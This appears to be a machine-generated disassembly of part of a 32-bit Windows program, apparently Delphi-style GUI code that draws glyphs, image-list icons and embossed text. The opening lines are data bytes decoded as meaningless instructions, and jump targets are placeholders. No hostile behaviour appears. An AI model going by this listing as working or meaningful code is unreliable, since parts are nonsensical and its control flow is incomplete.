add [ eax + esi * 2 ] bh
inc ecx
add [ eax + eax ] bh
add dh bh
clc
add [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8465646f
aas
inc esp
add [ eax + eax ] dh
insb
insb
push ebp
jo r-xdata
inc eax
add [ edx + 0x1 ] dh
add bh bh
fdiv [ eax + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
inc esp
add [ ecx ] ah
add bh bh
fadd [ edx - 0x7c8bffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] eax
jmp [ edi + ebp * 2 + 0x10043 ]
cwde
push edi
inc ecx
sub_435668
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_456568
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4356bc
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4565bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4356ec
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_418c70
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_418c2c
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4569f0
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_418b88
sub_435738
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4356ec
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_456c64
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_435764
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_418c58
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_418c2c
sub_435794
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4357d8
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_435808
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_435668
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4185a4
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418700
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_435868
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_41889c
mov eax ebx
call sub_403128
sub_435898
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4030f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_4359cc
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_40348c
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_435794
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_43592c
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403128
mov eax esi
call sub_435988
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
mov eax [ rw-data ]
call sub_43588c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
mov eax [ rw-data ]
call sub_403128
xor eax eax
mov [ rw-data ] eax
sub_435988
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
mov edx eax
mov eax [ esi + 0x8 ]
call sub_435764
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_435868
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_4359cc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_429bb8
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_435988
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4359fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_435988
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_429bb8
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_435a74
mov eax 0x1
sub_435a74
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_435988
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_4359cc
sub_435a9c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43604b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_4170c4
mov eax [ ebp - 0xc ]
call sub_4299e0
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424a38
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_4291a8
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_4170c4
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_435808
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_435794
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4299e0
push eax
mov eax [ ebp - 0xc ]
call sub_4299e0
lea edx [ ebp - 0x28 ]
pop ecx
call sub_424d38
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_435738
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_435738
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43600f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_4299e0
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424a38
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_429a9c
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_4299e0
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4299e0
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_424d38
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42a89c
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_4299e0
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_424a38
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4299e0
push eax
mov eax [ ebp - 0x14 ]
call sub_4299e0
lea edx [ ebp - 0x28 ]
pop ecx
call sub_424d38
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000014
call sub_424a38
mov eax [ ebp - 0x18 ]
call sub_425280
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4299e0
call sub_425280
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_4299e0
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_424a38
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4299e0
push eax
mov eax [ ebp - 0x14 ]
call sub_4299e0
lea edx [ ebp - 0x28 ]
pop ecx
call sub_424d38
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_424a38
mov eax [ ebp - 0x18 ]
call sub_425280
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4299e0
call sub_425280
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423dac
push eax
mov eax [ ebp - 0x10 ]
call sub_4299e0
mov eax [ eax + 0x14 ]
pop edx
call sub_424a38
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4299e0
push eax
mov eax [ ebp - 0x14 ]
call sub_4299e0
lea edx [ ebp - 0x28 ]
pop ecx
call sub_424d38
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424a38
mov eax [ ebp - 0x18 ]
call sub_425280
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4299e0
call sub_425280
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42a89c
mov eax [ ebp - 0xc ]
call sub_4299e0
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0xff00000f
call sub_424a38
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_424e6c
mov eax [ ebx + 0x14 ]
mov edx 0xff000014
call sub_424a38
push 0x0
mov eax ebx
call sub_425280
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_425280
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4299e0
call sub_425280
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_425280
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0xff000010
call sub_424a38
push 0x0
mov eax ebx
call sub_425280
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_425280
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4299e0
call sub_425280
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_425280
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_4299e0
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_42426c
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_42a89c
mov eax [ ebp - 0x14 ]
call sub_4299e0
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_424a38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403128
mov eax [ ebp - 0x14 ]
call sub_403128
retn
sub_436074
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0xc ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
call sub_435a9c
mov esi eax
call sub_43c760
call sub_43c840
test al al
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
xor edx edx
mov dl [ edi + 0x20 ]
mov ecx edx
cdq
idiv ecx
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
dec bl
je r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425280
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_4568b4
push eax
call ImageList_DrawEx
jmp r-xdata
cmp bl 0x3
jne r-xdata
mov bl 0x5
jmp r-xdata
dec ebx
sub bl 0x2
jb r-xdata
push 0x0
push 0x1fffffff
mov eax 0xff00000f
call sub_423dac
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425280
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_4568b4
push eax
call ImageList_DrawEx
call sub_43c760
lea ecx [ ebp - 0x14 ]
mov edx ebx
call sub_43caa4
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
call sub_4568b4
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_425280
push eax
call sub_43c760
lea ecx [ ebp - 0x14 ]
pop edx
call sub_43c990
jmp r-xdata
mov bl 0x4
jmp r-xdata
jmp r-xdata
mov bl 0x2
sub_4361d8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_424b54
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404178
push eax
mov eax esi
call sub_404378
push eax
mov eax ebx
call sub_425280
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000014
mov eax [ ebx + 0xc ]
call sub_42426c
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404178
push eax
mov eax esi
call sub_404378
push eax
mov eax ebx
call sub_425280
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ ebx + 0xc ]
call sub_42426c
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404178
push eax
mov eax esi
call sub_404378
push eax
mov eax ebx
call sub_425280
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4362b8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_417088
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_417088
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_417088
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_4170c4
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_417088
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_4170c4
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_404178
push eax
mov eax [ ebp + 0x20 ]
call sub_404378
push eax
mov eax [ ebp - 0x8 ]
call sub_425280
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_417088
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_404178
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_417088
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_417088
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_417088
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
call sub_43c760
call sub_43c840
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
push eax
push edi
call OffsetRect
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push edi
call OffsetRect
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
